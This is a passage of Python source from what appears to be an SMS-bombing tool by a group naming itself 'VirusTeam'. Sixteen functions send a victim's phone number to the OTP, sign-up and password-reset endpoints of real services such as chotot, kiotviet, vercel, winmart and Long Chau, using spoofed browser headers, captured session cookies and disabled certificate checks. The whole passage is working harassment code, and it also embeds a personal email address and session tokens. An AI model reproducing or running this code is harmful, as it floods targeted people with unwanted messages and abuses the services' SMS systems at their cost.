    "trackingId": "Y7Gqciut3EbiQWG3I23lY6HLTjCGUEpzNgHvj82E1V8viOPh631MvqpPmLFPDYNY"
}
    VirusTeam_PhanHoiTuWeb = requests.post(VirusTeam_Url, headers=headers, cookies=cookies, json=payload, verify=False)
    try:
        return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.json()
    except requests.exceptions.JSONDecodeError:
        return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.text
def VsTeamHttpRequests35(sdt_vs):
    VirusTeam_Url = "https://moneyveo.vn/vi/registernew/resendsmstokenjson/"
    headers = {
        "Host": "moneyveo.vn",
        "content-length": "24",
        "sec-ch-ua": '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
        "traceparent": "00-36f7cbdba56986f92375901912733bc0-f1eae8f8b73fc81b-00",
        "sec-ch-ua-mobile": "?0",
        "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
        "accept": "*/*",
        "x-requested-with": "XMLHttpRequest",
        "sec-ch-ua-platform": "Android",
        "origin": "https://moneyveo.vn",
        "sec-fetch-site": "same-origin",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://moneyveo.vn/vi/registernew/",
        "accept-encoding": "gzip, deflate, br, zstd",
        "accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5",
        "cookie": (
            "CaptchaCookieKey=0; ASP.NET_SessionId=f0xam3z5imkogjtdovkducer; language=vi; "
            "RequestData=21d58f5b-acd8-4269-a8cb-6ea6eb1ca3b4; "
            "LeadPartner31B92E50BCF7EFC6A1=lgid=6&lpid=utm_medium%3daffiliate%26utm_campaign%3dgoodaff%26utm_term%3d1654%26click_id%3d8c7896ba4ced5bacf4c8734d14e188f0; "
            "ET31B92E50BCF7EFC6A1=-8584793100376480976; _gid=GA1.2.1615630134.1719704856; "
            "UserTypeMarketing=L0; UserTypeLogin=Gửi quý khách hàng!; _fbp=fb.1.1719704858593.545089994205988570; "
            "UserMachineId_etag=a452925a-1e42-4b16-853e-a731e7c3832c; UserMachineId_cache=a452925a-1e42-4b16-853e-a731e7c3832c; "
            "UserMachineId=a452925a-1e42-4b16-853e-a731e7c3832c; UserMachineId_png=undefined; "
            "__sbref=kmqregqeacubijwxqxsufqqqoftboiebsagcwemg; _ga=GA1.2.1787464674.1719704856; "
            "_ga_LCPCW0ZYR8=GS1.1.1719704856.1.1.1719704888.28.0.0"
        ),
        "priority": "u=1, i"
    }
    payload = {"phoneNumber": sdt_vs}

    VirusTeam_PhanHoiTuWeb = requests.post(VirusTeam_Url, headers={k: str(v).encode('latin-1', 'replace').decode('latin-1') for k, v in headers.items()}, data=payload, verify=False)
    try:
        return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.json()
    except requests.exceptions.JSONDecodeError:
        return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.text
def VsTeamHttpRequests36(sdt_vs):
    VirusTeam_Url = 'https://gateway.chotot.com/v2/public/auth/send_otp_verify'
    headers = {
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
        'sec-ch-ua-platform': '"Android"',
        'sec-ch-ua-mobile': '?0',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
        'content-type': 'application/json',
        'accept': '*/*',
        'origin': 'https://id.chotot.com',
        'sec-fetch-site': 'same-site',
        'sec-fetch-mode': 'cors',
        'sec-fetch-dest': 'empty',
        'referer': 'https://id.chotot.com/',
        'accept-encoding': 'gzip, deflate, br, zstd',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'priority': 'u=1, i'
    }
    payload = {
        "phone": sdt_vs,
        "type": ""
    }
    VirusTeam_PhanHoiTuWeb = requests.post(VirusTeam_Url, headers=headers, json=payload, verify=False)
    try:
        return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.json()
    except requests.exceptions.JSONDecodeError:
        return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.text
def VsTeamHttpRequests37(sdt_vs):
    Topenland_Api = f'https://topenland.com/_next/data/vDnYyjJ7yIDCaHNQ78kco/vi/sign-up/verify-otp.json?phoneNumber={sdt_vs}'
    VirusTeam_PhanHoiTuWeb = requests.get(Topenland_Api)
    try:
        return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.json()
    except requests.exceptions.JSONDecodeError:
        return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.text
def VsTeamHttpRequests38(sdt_vs):
    VirusTeam_Url = 'https://www.kiotviet.vn/wp-content/themes/kiotviet/TechAPI/getOTP.php'
    ngaunhien = ''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=8))
    hoten = ''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=4))
    sdt_vs = '0' + sdt_vs
    sdt_vs = sdt_vs.replace('00', '')
    sdt_vs1 = '+84' + sdt_vs
    headers = {
        'authority': 'www.kiotviet.vn',
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'dnt': '1',
        'origin': 'https://www.kiotviet.vn',
        'referer': 'https://www.kiotviet.vn/dang-ky/?refcode=746',
        'sec-ch-ua': '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }
    cookies = {
        'ads': 'www.google.com',
        'refcode': '746',
        'time_referer': '1689061704',
        'kvas-uuid': '3a85af4a-1908-48f2-980d-d15395992de5',
        'kvas-uuid-d': '1686469706132',
        'gkvas-uuid': 'fc23dc65-4af3-4711-8198-90a46e6b0ca1',
        'gkvas-uuid-d': '1686469706134',
        'kv-session': '94e736d4-493e-4656-9a6a-266817374182',
        '_hjFirstSeen': '1',
        '_hjIncludedInSessionSample_563959': '1',
        '_hjSession_563959': 'eyJpZCI6ImEzM2Y4MWFmLWI2YWQtNDE4Ny04N2QxLWUwM2QyZTFmNDAyMiIsImNyZWF0ZWQiOjE2ODY0Njk3MDc2NzcsImluU2FtcGxlIjp0cnVlfQ==',
        '_gid': 'GA1.2.1638977009.1686469708',
        '_tt_enable_cookie': '1',
        '_ttp': 'KrXyjN8UQfZPEg6udl4pOmk7Tnd',
        '_gac_UA-158809353-1': '1.1686469710.CjwKCAjw4ZWkBhA4EiwAVJXwqaHz-822msy4qSq-UPOV3wfOsFZOOcHp2C8PHW1CIpeG35Ao3-Qx6xoCD0AQAvD_BwE',
        '_gac_UA-64814867-1': '1.1686469711.CjwKCAjw4ZWkBhA4EiwAVJXwqaHz-822msy4qSq-UPOV3wfOsFZOOcHp2C8PHW1CIpeG35Ao3-Qx6xoCD0AQAvD_BwE',
        'source_referer': '%5B%22refcode%7C746%7C2023-06-11%7Ccrmutm%3D%3Frefcode%3D746%2C%22%2C%22http-referral%7Cwww.google.com%7C2023-06-11%7Ccrmutm%3D%3Frefcode%3D746%26utm_source%3DGoogle%26utm_medium%3DKiotViet-Key%26utm_campaign%3DGoogle-Search%26utm_content%3DMien-phi-dung-thu%26gclid%3DCjwKCAjw4ZWkBhA4EiwAVJXwqaHz-822msy4qSq-UPOV3wfOsFZOOcHp2C8PHW1CIpeG35Ao3-Qx6xoCD0AQAvD_BwE%2C%22%2C%22refcode%7C746%7C2023-06-11%7Ccrmutm%3D%3Frefcode%3D746%26utm_source%3DGoogle%26utm_medium%3DKiotViet-Key%26utm_campaign%3DGoogle-Search%26utm_content%3DMien-phi-dung-thu%26gclid%3DCjwKCAjw4ZWkBhA4EiwAVJXwqaHz-822msy4qSq-UPOV3wfOsFZOOcHp2C8PHW1CIpeG35Ao3-Qx6xoCD0AQAvD_BwE%2C%22%5D',
        'kv-session-d': '1686469712238',
        '_hjSessionUser_563959': 'eyJpZCI6IjMwYjA2OGI0LTU4MzAtNTdkOS1iZjAwLWU0NjIxNzQ1MWZkYiIsImNyZWF0ZWQiOjE2ODY0Njk3MDc2NTcsImV4aXN0aW5nIjp0cnVlfQ==',
        'parent': '77',
        '_ga': 'GA1.2.1398574114.1686469708',
        '_ga_6HE3N545ZW': 'GS1.1.1686469708.1.1.1686469715.53.0.0',
        '_fw_crm_v': '4721c26b-683b-4e2b-dbb2-62e4d7a8e93d',
    }
    payload = {
        'phone': sdt_vs1,
        'code': ngaunhien,
        'name': 'Tmr Virus',
        'email': '',
        'zone': 'An Giang - Huyện Châu Phú',
        'merchant': 'muabansi',
        'username': sdt_vs,
        'industry': 'Ngành hàng bán lẻ',
        'ref_code': '746',
        'industry_id': '77',
        'phone_input': sdt_vs,
    }
    VirusTeam_PhanHoiTuWeb = requests.post(VirusTeam_Url, cookies=cookies, headers=headers, data=payload, verify=False)
    try:
        return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.json()
    except requests.exceptions.JSONDecodeError:
        return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.text
def VsTeamHttpRequests39(sdt_vs):
    VirusTeam_Url = 'https://routine.vn/customer/otp/send/'
    headers = {
        "host": "routine.vn",
        "content-length": "39",
        "sec-ch-ua": "\"Not/A)Brand\";v=\"8\", \"Chromium\";v=\"126\", \"Google Chrome\";v=\"126\"",
        "accept": "application/json, text/javascript, */*; q=0.01",
        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
        "x-requested-with": "XMLHttpRequest",
        "sec-ch-ua-mobile": "?0",
        "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
        "sec-ch-ua-platform": "\"Android\"",
        "origin": "https://routine.vn",
        "sec-fetch-site": "same-origin",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://routine.vn/",
        "accept-encoding": "gzip, deflate, br, zstd",
        "accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5",
        "priority": "u=1, i"
    }
    cookies = {
        "_gcl_au": "1.1.921545874.1719716236",
        "PHPSESSID": "19hv40npdfupthccv4iqiopatp",
        "wp_ga4_customerGroup": "NOT%20LOGGED%20IN",
        "form_key": "XmYe5ci3CL3puXrw",
        "X-Magento-Vary": "745a4c8f9a1d78367708bc5a17905540e5652703",
        "AMP_MKTG_d92ebfa0f9": "JTdCJTdE",
        "mage-cache-storage": "%7B%7D",
        "mage-cache-storage-section-invalidation": "%7B%7D",
        "mage-cache-sessid": "true",
        "_ga": "GA1.1.270413961.1719716243",
        "recently_viewed_product": "%7B%7D",
        "recently_viewed_product_previous": "%7B%7D",
        "recently_compared_product": "%7B%7D",
        "recently_compared_product_previous": "%7B%7D",
        "product_data_storage": "%7B%7D",
        "mage-messages": "",
        "_fbp": "fb.1.1719716243892.733877509802923114",
        "_tt_enable_cookie": "1",
        "_ttp": "VLg1aNxuznUG4RGPpAqTrA5FMZi",
        "_ym_uid": "1719716248980245264",
        "_ym_d": "1719716248",
        "_clck": "1at143d%7C2%7Cfn2%7C0%7C1642",
        "_ym_visorc": "w",
        "_ym_isad": "1",
        "_ga_JZNCRNC4SL": "GS1.1.1719716242.1.1.1719717312.60.0.0",
        "AMP_d92ebfa0f9": "JTdCJTIyZGV2aWNlSWQlMjIlM0ElMjIwNTc0NDM2MS1hNDAwLTQ3OTQtYWNlNi1lZGNhNWFlNWZjZjQlMjIlMkMlMjJzZXNzaW9uSWQlMjIlM0ExNzE5NzE2MjQxNzM1JTJDJTIyb3B0T3V0JTIyJTNBZmFsc2UlMkMlMjJsYXN0RXZlbnRUaW1lJTIyJTNBMTcxOTcxNzMxMjc4OSUyQyUyMmxhc3RFdmVudElkJTIyJTNBNiU3RA==",
        "private_content_version": "f7d52723a2eb820bb9a6cab8a011d92c",
        "_clsk": "1gzmda6%7C1719717318053%7C2%7C1%7Cp.clarity.ms%2Fcollect",
        "section_data_ids": "%7B%22customer%22%3A1719716244%7D"
    }
    payload = {
        "telephone": sdt_vs,
        "isForgotPassword": "0"
    }
    VirusTeam_PhanHoiTuWeb = requests.post(VirusTeam_Url, headers=headers, cookies=cookies, json=payload, verify=False)
    try:
        return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.json()
    except requests.exceptions.JSONDecodeError:
        return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.text
def VsTeamHttpRequests40(sdt_vs):
    VirusTeam_Url = f'https://vercel.com/api/v2/registration/start-verify-phone?email=duongbatuan87%40gmail.com&phone={sdt_vs}&country=vn'
    headers = {
        "host": "vercel.com",
        "content-length": "0",
        "sec-ch-ua": "\"Not/A)Brand\";v=\"8\", \"Chromium\";v=\"126\", \"Google Chrome\";v=\"126\"",
        "accept": "*/*",
        "sec-ch-ua-mobile": "?0",
        "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
        "sec-ch-ua-platform": "\"Android\"",
        "origin": "https://vercel.com",
        "sec-fetch-site": "same-origin",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://vercel.com/oauth/git?email=duongbatuan87%40gmail.com&loginError=%7B%22code%22%3A%22account_needs_verify%22%2C%22message%22%3A%22The%20account%20needs%20to%20be%20verified%20via%20SMS.%22%7D",
        "accept-encoding": "gzip, deflate, br, zstd",
        "accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5",
        "priority": "u=1, i"
    }
    cookies = {
        "locale": "en-US",
        "ko_id": "7668de6f-12f1-4e0f-8f4a-aecbe795e512",
        "vercel_session_id": "MjM0MDE3MzI1MywyNTEyODIzNzMsMzc2NjAzMTk3MSwzMTYzMTk4Mzk5LDM4ODM4NzA2ODk=",
        "_hp2_ses_props.3648353952": "%7B%22r%22%3A%22https%3A%2F%2Fvercel.com%2F%22%2C%22ts%22%3A1719808514580%2C%22d%22%3A%22vercel.com%22%2C%22h%22%3A%22%2Fnew%22%7D",
        "grw_i_3946978290": "x14a4srAnYNcAsNgpNPNo",
        "grw_exp_176382625": "0p0v0e1p0v0e2p0v0e3p0v0e4p0v0e5p0v0",
        "grw_exp_rules_176382625": "layerAssignment%2ClaunchedGroup%2ClaunchedGroup%2Cprestart%2ClaunchedGroup%2ClaunchedGroup",
        "grw_exp_groups_176382625": "%2CControl%2CControl%2C%2CControl%2CControl",
        "__ssid": "44bb517bcc848763ba122f0b898a910",
        "_hp2_id.3648353952": "%7B%22userId%22%3A%224921438829076366%22%2C%22pageviewId%22%3A%221687139218587527%22%2C%22sessionId%22%3A%221071712006642387%22%2C%22identity%22%3ANone%2C%22trackerVersion%22%3A%224.0%22%7D",
        "_hp2_props.3648353952": "%7B%22isLoggedIn%22%3AFalse%2C%22isVercelian%22%3AFalse%2C%22isVercelianEncoded%22%3A%22False%22%7D",
        "ko_sid": "{%22id%22:%221719808513901%22%2C%22lastTouched%22:1719808578045}"
    }
    payload = None
    VirusTeam_PhanHoiTuWeb = requests.post(VirusTeam_Url, headers=headers, cookies=cookies, json=payload, verify=False)
    try:
        return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.json()
    except requests.exceptions.JSONDecodeError:
        return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.text
def VsTeamHttpRequests41(sdt_vs):
    VirusTeam_Url = 'https://api-crownx.winmart.vn/as/api/plg/v1/user/forgot-pwd'
    headers = {
        "host": "api-crownx.winmart.vn",
        "content-length": "25",
        "sec-ch-ua": "\"Not/A)Brand\";v=\"8\", \"Chromium\";v=\"126\", \"Google Chrome\";v=\"126\"",
        "accept": "application/json",
        "content-type": "application/json",
        "sec-ch-ua-mobile": "?0",
        "authorization": "Bearer undefined",
        "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
        "sec-ch-ua-platform": "\"Android\"",
        "origin": "https://order.phuclong.com.vn",
        "sec-fetch-site": "cross-site",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://order.phuclong.com.vn/",
        "accept-encoding": "gzip, deflate, br, zstd",
        "accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5",
        "priority": "u=1, i"
    }
    cookies = {
        
    }
    payload = {
    "userName": sdt_vs
}
    VirusTeam_PhanHoiTuWeb = requests.post(VirusTeam_Url, headers=headers, cookies=cookies, json=payload, verify=False)
    try:
        return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.json()
    except requests.exceptions.JSONDecodeError:
        return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.text
def VsTeamHttpRequests42(sdt_vs):
    VirusTeam_Url = 'https://api.vietlott-sms.vn/mobile-api/register/registerWithPhoneNumber'
    headers = {
        "host": "api.vietlott-sms.vn",
        "connection": "keep-alive",
        "content-length": "28",
        "clientcallapi": "EMB",
        "deviceid": "57614729",
        "sec-ch-ua": "\"Not/A)Brand\";v=\"8\", \"Chromium\";v=\"126\", \"Google Chrome\";v=\"126\"",
        "sec-ch-ua-mobile": "?0",
        "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
        "content-type": "application/json",
        "accept": "*/*",
        "partnerchannel": "WEB",
        "identify-device-token": "token",
        "checksum": "eeff13e0d46a3f6ae16b56fb630cc7f4c49116d33bcce4322d71fa6c058086ad",
        "sec-ch-ua-platform": "\"Android\"",
        "origin": "https://vietlott-sms.vn",
        "sec-fetch-site": "same-site",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://vietlott-sms.vn/",
        "accept-encoding": "gzip, deflate, br, zstd",
        "accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5"
    }
    cookies = {
        
    }
    payload = {
    "phoneNumber": sdt_vs
}
    VirusTeam_PhanHoiTuWeb = requests.post(VirusTeam_Url, headers=headers, cookies=cookies, json=payload, verify=False)
    try:
        return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.json()
    except requests.exceptions.JSONDecodeError:
        return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.text
def VsTeamHttpRequests43(sdt_vs):
  cookies = {
    '_gcl_au': '1.1.713290776.1691278322',
    '_gid': 'GA1.2.538313268.1691278323',
    '_gat_UA-78703708-2': '1',
    '_ga': 'GA1.1.1304515259.1691278323',
    '_fbp': 'fb.1.1691278324147.1207721038',
    '_ga_P138SCK22P': 'GS1.1.1691278323.1.1.1691278362.21.0.0',
  }
  headers = {
    'Host': 'shopiness.vn',
    'Connection': 'keep-alive',
    # 'Content-Length': '63',
    'Accept': '*/*',
    'X-Requested-With': 'XMLHttpRequest',
    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'Origin': 'https://shopiness.vn',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Dest': 'empty',
    'Referer': 'https://shopiness.vn/khuyen-mai/pizza-hut-mua-1-tang-1-khi-giao-hang-tan-noi.80C793B3FC.html',
    # 'Accept-Encoding': 'gzip, deflate, br',
    'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
    # 'Cookie': '_gcl_au=1.1.713290776.1691278322; _gid=GA1.2.538313268.1691278323; _gat_UA-78703708-2=1; _ga=GA1.1.1304515259.1691278323; _fbp=fb.1.1691278324147.1207721038; _ga_P138SCK22P=GS1.1.1691278323.1.1.1691278362.21.0.0',
  }
  data = {
    'action': 'verify-registration-info',
    'phoneNumber': f'{sdt_vs}',
    'refCode': '',
  }
  response = requests.post('https://shopiness.vn/ajax/user', cookies=cookies, headers=headers, data=data).json()
def VsTeamHttpRequests44(sdt_vs):
  headers = {
    'Host': 'y360.vn',
    # 'content-length': '22',
    'accept': 'application/json',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36',
    'content-type': 'application/json',
    'origin': 'https://y360.vn',
    'x-requested-with': 'mark.via.gp',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-mode': 'cors',
    'sec-fetch-dest': 'empty',
    'referer': 'https://y360.vn/hoc/register',
    'accept-encoding': 'gzip, deflate, br',
    'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
    # 'cookie': '_gcl_au=1.1.977893193.1691134633; _gid=GA1.2.1747107574.1691134633; _gat_gtag_UA_211029013_1=1; _fbp=fb.1.1691134636760.1633963715; _ga=GA1.1.329512893.1691134633; _ga_M7ZN50PQ1V=GS1.1.1691134632.1.1.1691134646.0.0.0; _ga_BS2V9QEV6V=GS1.1.1691134633.1.1.1691134667.0.0.0',
    }
  data = '{"phone":"sdt_vs"}'.replace("sdt_vs",sdt_vs)
  response = requests.post('https://y360.vn/api/v1/user/register', data=data, headers=headers).json()
def VsTeamHttpRequests45(sdt_vs):
    VirusTeam_Url = 'https://api.nhathuoclongchau.com.vn/lccus/is/user/new-send-verification'
    headers = {
        "host": "api.nhathuoclongchau.com.vn",
        "content-length": "60",
        "sec-ch-ua": "\"Not/A)Brand\";v=\"8\", \"Chromium\";v=\"126\", \"Google Chrome\";v=\"126\"",
        "sec-ch-ua-mobile": "?0",
        "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
        "x-channel": "EStore",
        "content-type": "application/json",
        "access-control-allow-origin": "*",
        "accept": "application/json, text/plain, */*",
        "order-channel": "1",
        "sec-ch-ua-platform": "\"Android\"",
        "origin": "https://nhathuoclongchau.com.vn",
        "sec-fetch-site": "same-site",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://nhathuoclongchau.com.vn/",
        "accept-encoding": "gzip, deflate, br, zstd",
        "accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5",
        "priority": "u=1, i"
    }
    cookies = {

    }
    payload = {
    "phoneNumber": sdt_vs,
    "otpType": 1,
    "fromSys": "WEBKHLC"
}
    VirusTeam_PhanHoiTuWeb = requests.post(VirusTeam_Url, headers=headers, cookies=cookies, json=payload, verify=False)
    try:
        return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.json()
    except requests.exceptions.JSONDecodeError:
        return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.text
def VsTeamHttpRequests46(sdt_vs):
  headers = {
    'Host': 'vi.appota.com',
    # 'content-length': '23',
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'x-requested-with': 'XMLHttpRequest',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'origin': 'https://vi.appota.com',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-mode': 'cors',
    'sec-fetch-dest': 'empty',
    'referer': 'https://vi.appota.com/',
    # 'accept-encoding': 'gzip, deflate, br',
    'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
    # 'cookie': '_gid=GA1.2.794950800.1691145824; _ga_SQM4TCSQGX=GS1.1.1691145825.1.1.1691145870.0.0.0; pay_session=eyJpdiI6IkRieTVpNm1rTVVjWElNNnNoRENVVVE9PSIsInZhbHVlIjoiVTdCSTdYQ0gyM2Z2UFlkbStCaWtldjNGdlpsSm5lRk9kNVpMbkQxTysydGNPSGhXSk9CT0xmNVhReUp4TXVkaTQ2XC9PYTZrRUZUSE1kXC9Jbm1WbTNuUT09IiwibWFjIjoiNjAxYTBhMjlhYWE0N2RiMTA3ZTg5MGZjOWNjZmVlOWM1MzNkMjhlZGI0NjNmMGYxYmVhNGI5MWM3MmZiZGU1MSJ9; _ga=GA1.2.626969575.1691145824; _gat=1; _fbp=fb.1.1691145877829.1126099989; _ga_8W5EGNGFDP=GS1.2.1691145878.1.0.1691145878.0.0.0',
  }
  data = {
    'phone_number': f'{sdt_vs}',
  }
  response = requests.post('https://vi.appota.com/check-phone-register.html',data=data,headers=headers).text
def VsTeamHttpRequests47(sdt_vs):
  cookies = {
    '_ga': 'GA1.1.1928856259.1691039310',
    'serverChoice': 'Server-IPv1',
    '_ga_Y4RF4MF664': 'GS1.1.1691039309.1.1.1691039359.0.0.0',
  }
  headers = {
    'authority': 'crowstore.online',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9,vi;q=0.8',
    'cache-control': 'max-age=0',
    'content-type': 'application/x-www-form-urlencoded',
    # 'cookie': '_ga=GA1.1.1928856259.1691039310; serverChoice=Server-IPv1; _ga_Y4RF4MF664=GS1.1.1691039309.1.1.1691039359.0.0.0',
    'origin': 'https://crowstore.online',
    'referer': 'https://crowstore.online/sms.php',
    'sec-ch-ua': '"Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36',
  }
  data = {
    'sodienthoai': sdt_vs,
    'ten_server': 'Server-IPv1',
    'key': 'freekey307',
  }
  response = requests.post('https://crowstore.online/sms.php', cookies=cookies, headers=headers, data=data).text
def VsTeamHttpRequests48(sdt_vs):
    Batdongsan_Api = f'https://batdongsan.com.vn/user-management-service/api/v1/Otp/SendToRegister'
    params = {
        'phoneNumber': sdt_vs
    }
    response = requests.get(Batdongsan_Api, params=params)
def VsTeamHttpRequests49(sdt_vs):
  headers = {
    'Host': 'www.sapo.vn',
    # 'content-length': '22',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'accept': '*/*',
    'origin': 'https://www.sapo.vn',
    'x-requested-with': 'mark.via.gp',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-mode': 'cors',
    'sec-fetch-dest': 'empty',
    'referer': 'https://www.sapo.vn/blog/mat-hang-kinh-doanh-hot-nhat-hien-nay',
    # 'accept-encoding': 'gzip, deflate, br',
    'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
    # 'cookie': '_gcl_au=1.1.1060296146.1691285262; _gid=GA1.2.497444655.1691285263; _ga_YNVPPJ8MZP=GS1.1.1691285263.1.0.1691285263.60.0.0; _ga=GA1.1.1816034013.1691285263; _ga_8956TVT2M3=GS1.1.1691285264.1.0.1691285264.60.0.0; _ga_CDD1S5P7D4=GS1.1.1691285264.1.0.1691285264.60.0.0; _ga_GECRBQV6JK=GS1.1.1691285264.1.0.1691285264.60.0.0; _ga_Y9YZPDEGP0=GS1.1.1691285265.1.0.1691285265.60.0.0; start_time=08/06/2023 8:27:45; source=https://www.sapo.vn/blog/mat-hang-kinh-doanh-hot-nhat-hien-nay; _ga_X10JR147Y7=GS1.1.1691285264.1.0.1691285265.59.0.0; _fbp=fb.1.1691285267174.309606627; _ga_EBZKH8C7MK=GS1.2.1691285267.1.0.1691285267.0.0.0; referral=https://www.google.com/; landing_page=https://www.sapo.vn/blog/mat-hang-kinh-doanh-hot-nhat-hien-nay; pageview=1; _ga_8Z6MB85ZM2=GS1.1.1691285265.1.1.1691285333.60.0.0',
    }
  data = {
    'phonenumber': f'{sdt_vs}',
  }
  response = requests.post('https://www.sapo.vn/fnb/sendotp', headers=headers, data=data).json()
def VsTeamHttpRequests50(sdt_vs):
    VirusTeam_Url = f'https://api.glxplay.io/account/phone/verify?phone={sdt_vs}'
    headers = {
